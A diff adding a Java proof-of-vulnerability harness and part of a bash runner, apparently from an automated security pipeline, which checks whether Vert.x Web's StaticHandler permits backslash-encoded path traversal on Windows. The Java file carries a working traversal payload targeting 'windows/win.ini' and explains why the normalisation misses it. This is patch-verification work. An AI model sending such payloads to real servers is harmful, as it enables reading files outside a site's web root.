+import io.vertx.core.Future;
+import io.vertx.core.Handler;
+import io.vertx.core.http.HttpMethod;
+import io.vertx.ext.web.RoutingContext;
+import io.vertx.ext.web.handler.StaticHandler;
+
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+
+/**
+ * Proof of Vulnerability for CWE-022 (Path Traversal) in
+ * io.vertx.ext.web.handler.impl.StaticHandlerImpl.
+ *
+ * A remote client can request a URL that percent-encodes Windows path
+ * separators (%5C == '\'). The StaticHandler normalization chain
+ *
+ *     Utils.removeDots(Utils.urlDecode(context.normalisedPath(), false))
+ *
+ * only strips "../" sequences that use the forward slash. Back-slash based
+ * traversal ("\..\..\") passes through untouched, so the string that
+ * StaticHandlerImpl finally hands to the file system
+ *
+ *     webRoot + Utils.pathOffset(path)
+ *
+ * still contains ".." components. On a Windows host (where '\' is the path
+ * separator) that path escapes the configured web root and discloses
+ * arbitrary files.
+ *
+ * This POV drives the REAL StaticHandlerImpl.handle() with an attacker
+ * controlled request path and intercepts the exact file path the handler
+ * asks the file system to open (fs.exists(file, ...)). It then interprets
+ * that path the way a Windows file system would (treating both '/' and '\'
+ * as separators, resolving "..") and asserts that it escapes the web root.
+ *
+ * Exit 0  -> vulnerable (resolved file escapes the web root)
+ * Exit 1  -> not vulnerable (traversal was neutralized / rejected)
+ */
+public class PovStaticHandlerTraversal {
+
+  // captured file path StaticHandlerImpl passes to FileSystem.exists(...)
+  static volatile String capturedFile = null;
+
+  public static void main(String[] args) {
+    final String WEB_ROOT = "webroot";
+    // Attacker request. After the server URL-normalizes the request line this
+    // is what RoutingContext.normalisedPath() returns (verified independently
+    // via io.vertx.ext.web.impl.Utils.normalizePath).
+    final String maliciousNormalisedPath =
+        "/%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini";
+
+    StaticHandler handler = StaticHandler.create()
+        .setWebRoot(WEB_ROOT)
+        .setCachingEnabled(false)
+        .setIncludeHidden(true);
+
+    RoutingContext ctx = makeRoutingContext(maliciousNormalisedPath);
+
+    try {
+      handler.handle(ctx);
+    } catch (Throwable t) {
+      // A hardened handler may reject with an exception; that is a safe outcome.
+      System.out.println("[info] handler threw: " + t);
+    }
+
+    System.out.println("request normalisedPath : " + maliciousNormalisedPath);
+    System.out.println("configured webRoot     : " + WEB_ROOT);
+    System.out.println("file path opened by    : " + capturedFile);
+
+    if (capturedFile == null) {
+      System.out.println("RESULT: not vulnerable (handler never touched the file system for this path)");
+      System.exit(1);
+    }
+
+    boolean escapes = escapesWebRoot(capturedFile);
+    if (escapes) {
+      System.out.println("RESULT: VULNERABLE - resolved file escapes the web root '" + WEB_ROOT + "'");
+      System.out.println("        (on a Windows host this reads a file outside the served directory)");
+      System.exit(0);
+    } else {
+      System.out.println("RESULT: not vulnerable (resolved file stays within the web root)");
+      System.exit(1);
+    }
+  }
+
+  /**
+   * Interpret the resolved file string the way a Windows file system would:
+   * both '/' and '\' are separators and ".." pops a directory. Returns true if
+   * the path traverses above its first (web root) component.
+   */
+  static boolean escapesWebRoot(String file) {
+    String[] parts = file.split("[/\\\\]+");
+    int depth = 0;
+    for (String p : parts) {
+      if (p.isEmpty() || p.equals(".")) {
+        continue;
+      }
+      if (p.equals("..")) {
+        if (depth == 0) {
+          return true; // popped above the web root -> traversal
+        }
+        depth--;
+      } else {
+        depth++;
+      }
+    }
+    return false;
+  }
+
+  // ---- Minimal RoutingContext / Vertx / FileSystem test doubles ----------
+
+  static RoutingContext makeRoutingContext(final String normalisedPath) {
+    final Object request = proxy("io.vertx.core.http.HttpServerRequest", (m, a) -> {
+      switch (m.getName()) {
+        case "method": return HttpMethod.GET;
+        case "path":   return "/attack";
+        default:       return defaultValue(m);
+      }
+    });
+
+    final Object fileSystem = proxy("io.vertx.core.file.FileSystem", (m, a) -> {
+      if (m.getName().equals("exists") && a != null && a.length == 2) {
+        capturedFile = String.valueOf(a[0]);
+        @SuppressWarnings("unchecked")
+        Handler<Object> h = (Handler<Object>) a[1];
+        // report "does not exist" so the handler unwinds cleanly after we captured the path
+        h.handle(Future.succeededFuture(Boolean.FALSE));
+        return null;
+      }
+      return defaultValue(m);
+    });
+
+    final Object vertx = proxy("io.vertx.core.Vertx", (m, a) -> {
+      if (m.getName().equals("fileSystem")) return fileSystem;
+      return defaultValue(m);
+    });
+
+    final Object route = proxy("io.vertx.ext.web.Route", (m, a) -> {
+      if (m.getName().equals("getPath")) return null; // no route prefix
+      return defaultValue(m);
+    });
+
+    return (RoutingContext) proxy("io.vertx.ext.web.RoutingContext", (m, a) -> {
+      switch (m.getName()) {
+        case "request":        return request;
+        case "vertx":          return vertx;
+        case "normalisedPath": return normalisedPath;
+        case "mountPoint":     return null;
+        case "currentRoute":   return route;
+        case "next":           return null;
+        case "fail":           return null;
+        default:               return defaultValue(m);
+      }
+    });
+  }
+
+  interface Dispatch { Object invoke(Method m, Object[] a) throws Throwable; }
+
+  static Object proxy(String iface, final Dispatch d) {
+    final Class<?> c;
+    try {
+      c = Class.forName(iface);
+    } catch (ClassNotFoundException e) {
+      throw new RuntimeException(e);
+    }
+    return Proxy.newProxyInstance(
+        PovStaticHandlerTraversal.class.getClassLoader(),
+        new Class<?>[]{c},
+        new InvocationHandler() {
+          @Override public Object invoke(Object p, Method m, Object[] a) throws Throwable {
+            switch (m.getName()) {
+              case "toString": return iface + "$proxy";
+              case "hashCode": return System.identityHashCode(p);
+              case "equals":   return p == (a == null ? null : a[0]);
+            }
+            return d.invoke(m, a);
+          }
+        });
+  }
+
+  static Object defaultValue(Method m) {
+    Class<?> r = m.getReturnType();
+    if (!r.isPrimitive()) return null;
+    if (r == boolean.class) return Boolean.FALSE;
+    if (r == void.class)    return null;
+    if (r == char.class)    return (char) 0;
+    if (r == byte.class)    return (byte) 0;
+    if (r == short.class)   return (short) 0;
+    if (r == int.class)     return 0;
+    if (r == long.class)    return 0L;
+    if (r == float.class)   return 0f;
+    if (r == double.class)  return 0d;
+    return null;
+  }
+}

+#!/usr/bin/env bash
+# Proof-of-Vulnerability runner for CWE-022 path traversal in StaticHandlerImpl.
+# Recompiles the (possibly patched) vertx-web module from source, then drives the
+# real StaticHandlerImpl.handle() with a malicious request and checks whether the
+# resolved file escapes the configured web root.
+#
+# Exit 0 => vulnerable (unpatched).  Exit non-zero => patched / not reproducible.
+set -u
+REPO=/workspace/repo
+POV="$REPO/.security-pipeline/pov"
+CP_FILE="$POV/cp.txt"
+
+cd "$REPO/vertx-web" || exit 3
+
+# Recompile the module from current (possibly patched) sources.
+mvn -q -B -o -DskipTests compile >"$POV/compile.log" 2>&1 \
+  || mvn -q -B -DskipTests compile >"$POV/compile.log" 2>&1
+if [ ! -f "$REPO/vertx-web/target/classes/io/vertx/ext/web/impl/Utils.class" ]; then
+  echo "[pov] failed to compile vertx-web; see compile.log"; tail -20 "$POV/compile.log"; exit 3
+fi
+

+if [ ! -s "$CP_FILE" ]; then
+  mvn -q -B -o dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >>"$POV/compile.log" 2>&1 \
+    || mvn -q -B dependency:build-classpath -Dmdep.outputFile="$CP_FILE" >>"$POV/compile.log" 2>&1
+fi

+CP="$(cat "$CP_FILE"):$REPO/vertx-web/target/classes"

+cd "$POV" || exit 3
